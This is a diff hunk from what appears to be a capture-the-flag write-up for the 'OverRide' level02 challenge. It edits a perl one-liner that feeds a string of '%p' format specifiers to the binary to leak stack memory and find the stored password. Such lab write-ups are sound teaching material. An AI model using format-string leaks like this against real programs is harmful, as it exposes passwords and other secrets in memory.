@@ -4,7 +4,7 @@ The program reads a username and a password from stdin, then it compares the pas
 
 ## Step 1. Find real password in stack
 ```
-level02@OverRide:~$ perl -e 'print "%p "x30 . "\n"' | ./level02
+level02@OverRide:~$ perl -le 'print "%p "x30' | ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
